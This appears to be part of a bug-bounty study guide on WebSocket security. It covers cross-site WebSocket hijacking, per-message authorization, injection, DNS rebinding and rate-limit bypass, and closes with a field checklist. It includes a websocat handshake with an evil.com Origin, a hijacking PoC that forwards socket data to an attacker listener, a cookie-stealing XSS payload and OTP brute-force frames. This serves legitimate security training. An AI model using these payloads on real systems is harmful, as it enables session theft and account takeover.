Replay the handshake with a **foreign `Origin`** and the victim cookie (e.g., `websocat -H 'Origin: https://evil.com' -H 'Cookie: session=...'`) — if it connects **authenticated**, the server ignores Origin. But that CLI check is only an **oracle**; the real finding requires the **browser** to attach the cookie **cross-site**, so you must confirm with a real-browser PoC. If the session cookie is `SameSite=Strict` (or Lax blocks the cross-site WS), the browser won't send it and it's **not exploitable** CSWSH — that's the auto-reject.

### Q120. The handshake *does* validate Origin. Is the WebSocket safe?
No — you've only closed *one* of two surfaces. Move to the **message layer**: is there **per-message authorization** (or does the server authorize only at connect, letting you swap another user's id in a frame = IDOR/BOLA, or send a privileged/admin message type = BFLA)? And is every field **re-validated** server-side (a frame carrying a search term, a URL, an HTML fragment = SQLi/SSRF/XSS)? Origin validation stops CSWSH, not authz or injection.

### Q121. Why is the message layer especially dangerous for injection?
Because WS frames are an **untrusted input channel that security tooling often ignores** — WAFs and request-logging usually inspect HTTP requests, not individual WebSocket frames. So the *same* XSS/SQLi/NoSQLi/command-injection/SSRF you'd test over HTTP, sent inside a frame, frequently lands **without tripping the WAF and without appearing in logs**. A chat message rendered to other users is **stored XSS**; a search field in a frame hitting the DB is **SQLi** — over a channel nobody's filtering.

### Q122. Where do tokens leak in WebSocket apps?
Two classic spots: **token-in-URL** — `wss://app/ws?token=…` puts the credential in proxy/server logs, browser history, and the `Referer` (CWE-598/200); and **secrets streamed on the socket** — apps often send the session token, API key, or a password-reset link **down the socket on connect**, which is exactly what makes CSWSH an ATO. Tokens belong in the handshake headers/body, never the URL, and secrets shouldn't be volunteered on the stream.

### Q123. Explain the DNS-rebinding angle for local/internal WebSocket servers.
Local and internal WS/HTTP servers often "authenticate" by **network position** ("only localhost/the LAN can reach me") or by the **`Origin` header**. Both are defeated by **DNS rebinding**: a malicious site rebinds its hostname to `127.0.0.1`/a private IP, turning the victim's browser into a proxy into the LAN (Brannon Dorsey's 2018 research pwned Google Home/Sonos/Roku this way). The lesson: **`Origin` and "it's internal" are not access controls** — local WS servers need real authentication.

### Q124. How do WebSockets help bypass rate-limits?
Many apps rate-limit **HTTP requests** but apply **no per-message throttle** on an open socket — so you open **one** connection and send thousands of `login`/`otp`/`coupon` messages down it, bypassing the per-request limiter entirely. It turns a throttled endpoint into an un-throttled one. The fix (and the tell) is **per-message** rate-limiting, not per-connection.

### Q125. What framework-specific quirks matter?
**socket.io** has its own packet format (`42["event",{...}]`) and its own Origin/CORS config that's easy to leave open; **SignalR** uses `/negotiate` then a hub — check hub-method authz; **STOMP** over WS has `SUBSCRIBE`/`SEND` destinations with their own authz; **SockJS** has HTTP fallbacks (xhr-streaming) that change the attack; **graphql-ws** subscriptions are a CSWSH surface (GraphQL over WS). Fingerprint the sub-protocol — the defaults are where the bugs hide.

### Q126. What's the top fix, and the CWE?
**Validate the `Origin` header at the handshake against an allow-list AND require a CSRF token / unpredictable value** (kills CSWSH), don't authenticate WS by ambient cookies across sites, set the cookie `SameSite=Strict`, enforce **authorization on every message**, and validate/encode every frame field. Primary CWE: **CWE-1385** (Missing Origin Validation in WebSockets) / **CWE-352** (CSRF); plus **CWE-346** (Origin validation error) and the injection CWEs for message-layer bugs.

### Q127. Rapid fire.
**Foreign Origin connects authed?** → CSWSH oracle (confirm in browser). **`SameSite=Strict`?** → CSWSH not exploitable. **Origin validated but id swappable in a frame?** → per-message IDOR. **`ws://`?** → cleartext, CWE-319. **`?token=` in the URL?** → session leak. **Frame with `<script>` rendered to others?** → stored XSS past the WAF. **CWE for CSWSH?** → CWE-1385/352.

---

# LEVEL 8 — SCENARIO (walk me through it)

> "Here's the socket — what do you do?" End-to-end reasoning from a handshake to a proven Critical (or an honest downgrade). Full worked run: guide **Appendix D**.

### Q128. You find `wss://chat.example/ws`; the handshake sends only a session cookie. First moves?
Baseline the auth model, then test CSWSH. I replay the handshake with a **foreign `Origin`** + the victim cookie (`websocat -H 'Origin: https://evil.com' ...`); if it connects **authenticated** and starts streaming the victim's data, the server ignores Origin. That's the oracle — next I confirm it's browser-exploitable (does the cookie go cross-site / is `SameSite` not Strict). I don't report on the CLI oracle alone.

### Q129. The foreign-Origin handshake is accepted and the socket streams `{"whoami":..., "apiToken":"sk_..."}`. Weaponize safely.
Full CSWSH → ATO. I host a page on my domain with `new WebSocket("wss://chat.example/ws")` and `ws.onmessage → fetch("https://my-oob/?d="+e.data)`; when my **own victim test account** (logged in) visits, the browser attaches the cookie, the socket streams the `apiToken` to my listener = account takeover, and `ws.send(...)` proves state-change as the victim. One benign exfil to my own server, my own account, then stop. I report ATO with the browser PoC + listener log.

### Q130. The handshake validates `Origin` correctly. Where do you look next?
The **message layer** — CSWSH is dead but authz/injection may not be. I test **per-message authorization**: log in as my account A, capture a message like `{"action":"getMessages","chatId":123}`, and swap in account B's `chatId` — if I read B's messages, that's **IDOR/BOLA over WS** (server authorized only at connect). I also try **privileged message types** (`{"action":"deleteUser"}` = BFLA) and feed each rendered/backend field an injection probe. Origin validation only closed the handshake surface.

### Q131. A chat message you send appears verbatim in other users' browsers. What's the bug and impact?
**Stored XSS over WebSocket.** I send a frame like `{"type":"msg","text":"<img src=x onerror=fetch('//oob/'+document.cookie)>"}`; if it renders unescaped in other users' chat windows, my JavaScript runs in their session → session theft / ATO across everyone in the channel. It's especially nasty because the payload traveled inside a WS frame, so a WAF watching HTTP requests likely never saw it. I prove with a benign `alert(document.domain)`-style marker and report stored XSS via the message layer.

### Q132. The login endpoint is rate-limited, but there's a `wss://` auth channel. How might you brute anyway?
Check whether the rate-limit is **per-connection or per-message**. I open one socket and send many `{"action":"login","otp":"000000"}`…`{"otp":"999999"}` frames down it; if the server throttles HTTP requests but not individual frames, I've bypassed the limiter on a single connection. I prove the bypass with a **measured count** (e.g., 500 attempts accepted in a window that HTTP caps at 5) — I don't actually crack a real account. Fix: per-message rate-limiting.

### Q133. You find a desktop app running a local WebSocket server on `ws://127.0.0.1:9000`. Is that reachable from the web?
Potentially, via **DNS rebinding** (or a missing Origin check). If the local server trusts network position or a weak/absent Origin check, a malicious website can rebind its DNS to `127.0.0.1` and, from the victim's browser, connect to `ws://127.0.0.1:9000` and drive whatever the local app exposes (this is the Dorsey-2018 class). I'd test whether the local WS validates Origin and requires a real token; if not, it's reachable cross-origin and I report it with a rebinding/Origin PoC. "It's only on localhost" is not authentication.

### Q134. The app uses socket.io and you see frames like `42["message",{...}]`. Anything change?
Yes — I fingerprint the **socket.io** layer: it has its own handshake (`/socket.io/?EIO=4&transport=...`) and its **own CORS/Origin config**, which is frequently left permissive, so CSWSH is tested against socket.io's config, not a raw WS check. I decode the `42[...]` packet format to send/replay events, check event-level authorization (can I emit a privileged event?), and note the polling **fallback transport** (xhr) which behaves differently. Same two questions — handshake authz + per-message authz — just in socket.io's dialect.

### Q135. CSWSH works but the program says "prove impact, not just missing Origin validation." How do you satisfy that?
I demonstrate the **concrete data theft / action**, not the config gap. Using my **own victim test account**, I show the socket streaming that account's private data (chat history, and especially a token) to my attacker-origin listener via the browser PoC, and I show `ws.send` performing a real state change as the victim (e.g., post a message / change a setting). That's "impact": read + write in the victim's session = data theft + ATO. I document the exact stolen fields (redacted), unpublish, and report — which is exactly what "demonstrated impact" means.

---

# APPENDIX — 60-SECOND FIELD CHECKLIST
```
[ ] Find ws(s):// endpoints (DevTools→WS, JS new WebSocket(/io(/SockJS(, Burp WebSockets, /ws /socket.io /cable /hub /graphql).
[ ] Baseline handshake: auth = COOKIE or TOKEN? Origin validated? wss? map message types (id/action/rendered/backend).
[ ] CSWSH: foreign Origin + victim COOKIE stays authed? → prove in a REAL BROWSER, cross-site → read data + state change → ATO.
[ ] Auth over WS: swap B's id in a frame (IDOR) · privileged message type (BFLA) · unauth message types · channel/topic authz.
[ ] Message injection: XSS(rendered to others) · SQLi/NoSQLi · cmdi/SSRF(OOB) · path-traversal · mass-assign · deserialize(binary).
[ ] Rate-limit: many attempts on one socket (measured count vs cap). Transport: ws:// or token-in-URL. DoS: measure (permission).
[ ] Framework quirks: socket.io 42[...] · SignalR /negotiate+hub · STOMP destinations · SockJS fallbacks · graphql-ws.
[ ] Validate (CSWSH real-browser / two-account IDOR / injection signal) → CVSS + CWE-1385/346 (or injection CWE) → clean PoC → dedup.
[ ] Own accounts, exfil to your server, revert state, measured brute, no sustained DoS.
```

> **Authorized testing only.** Prove CSWSH cross-site in a real browser with your own victim account (exfil to your own server), use two own accounts for IDOR, measured counts for brute, measure-don't-flood for DoS, revert state. Report **impact** (data theft, ATO, RCE, stored-XSS, cross-user) — not "no Origin check."
